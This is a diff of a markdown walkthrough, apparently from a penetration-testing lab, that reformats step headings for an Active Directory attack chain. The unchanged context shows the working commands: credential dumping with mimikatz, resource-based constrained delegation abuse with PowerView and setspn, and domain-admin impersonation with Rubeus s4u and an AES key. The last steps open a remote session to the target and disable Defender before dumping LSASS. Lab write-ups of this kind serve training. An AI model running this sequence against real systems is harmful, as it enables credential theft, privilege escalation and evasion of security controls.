@@ -16,7 +16,7 @@ Write permissions: IT-EMployee15$ → Generic Write IT-track-01
 
 Abuse of permision in it-employeetest.it.gcb.local is posible access to it-track01 using constrained delegation based on user resource:
 
-1. Impersonate IT-Employee15$ machine account domain:
+### 1. Impersonate IT-Employee15$ machine account domain:
 
 ```
 PS C:\> C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
@@ -114,7 +114,7 @@ Cached Tickets: (1)
 
 
 
-2. PowerView Modune with Get-DomainRBCD and Set-DomainRBCD cmdlets:
+### 2. PowerView Modune with Get-DomainRBCD and Set-DomainRBCD cmdlets:
 
 ```
 PS C:\tools> copy \\tsclient\tmp\RBCD\PowerView.ps1 PowerView_RBCD.ps1
@@ -151,7 +151,7 @@ DelegatedAccountControl    : WORKSTATION_TRUST_ACCOUNT
 DelegatedDistinguishedName : CN=IT-EMPLOYEE15,OU=ITEmployees,DC=it,DC=gcb,DC=local
 
 ```
-3. Set Spn for it-track01:
+### 3. Set Spn for it-track01:
 
 ```
 PS C:\tools> setspn.exe -r it-track01
@@ -170,7 +170,7 @@ Registering ServicePrincipalNames for CN=IT-TRACK01,CN=Computers,DC=it,DC=gcb,DC
 Updated object
 ```
 
-4. validate IT-track01 msds-allowedtoactonbehalfofotheridentity:
+### 4. validate IT-track01 serviceprincipalname and msds-allowedtoactonbehalfofotheridentity properties :
 
 ```
 PS C:\tools> Get-ADComputer -Identity IT-TRACK01 -Properties * | select -ExpandProperty servicePrincipalname
@@ -193,7 +193,7 @@ Path Owner                  Access
 
 ```
 
-5. Impersonate Domain Admin from it-employee15& account domain:
+### 5. Impersonate Domain Admin from it-employee15$ account domain:
 
 ```
 PS C:\tools> .\Rubeus.exe s4u /user:it-employee15$ /aes256:060cc6bb7bf5d57743ef25b94921146e12a55a2e83fed14d639802eed723f
@@ -314,7 +314,7 @@ PS C:\tools> .\Rubeus.exe s4u /user:it-employee15$ /aes256:060cc6bb7bf5d57743ef2
 [+] Ticket successfully imported!
 ```
 
-6. Access to the target machine:
+### 6. Access to the target machine:
 
 ```
 PS C:\tools> Enter-PSSession -ComputerName it-track01.it.gcb.local
@@ -336,7 +336,7 @@ Ethernet adapter Ethernet:
    Default Gateway . . . . . . . . . : 192.168.4.254
 ```
 
-7. Diable AV and dump Lsass process:
+### 7. Disable AV and dump Lsass process:
 
 ```
 [it-track01.it.gcb.local]: PS C:\Users\Administrator.IT\Documents> Set-MpPreference -DisableRealtimeMonitoring $True
